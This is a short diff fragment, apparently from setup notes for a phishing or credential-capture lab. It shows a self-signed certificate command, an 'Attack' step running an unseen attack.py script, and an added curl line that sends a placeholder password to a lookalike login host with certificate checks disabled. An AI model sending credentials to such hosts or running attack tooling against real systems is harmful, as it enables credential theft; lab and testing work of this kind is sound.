@@ -23,9 +23,15 @@ sudo openssl req -new -x509 \
   -days 365
 
  curl -k -L http://secure-login.com
+ curl -k -L "https://secure-login.com/submit?password=SECRET123"
+
 
 Attack
 sudo python3 /opt/tools/attack.py
+
+
+
+
 
 
 server {
